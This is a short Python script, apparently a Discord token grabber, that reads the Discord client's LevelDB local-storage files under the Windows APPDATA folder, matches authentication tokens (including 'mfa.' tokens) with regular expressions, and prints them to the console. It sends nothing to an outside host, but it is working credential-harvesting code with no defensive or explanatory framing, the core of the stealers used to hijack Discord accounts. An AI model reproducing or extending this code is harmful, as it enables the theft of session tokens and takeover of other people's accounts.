import os
from re import findall

appdata = os.getenv("APPDATA")
discord_path = appdata + "\\Discord\\Local Storage\\leveldb"

def gettokens(path):

    tokens = []

    for file in os.listdir(path):
        if not file.endswith(".log") and not file.endswith(".ldb"):
            continue

        for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:

            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):

                for token in findall(regex, line):
                    tokens.append(token)

    tokens = "\n".join(token for token in tokens)
    return tokens

print("Tokens Found:")
print(gettokens(discord_path))
print()
print("Press any key to close this window.")
input()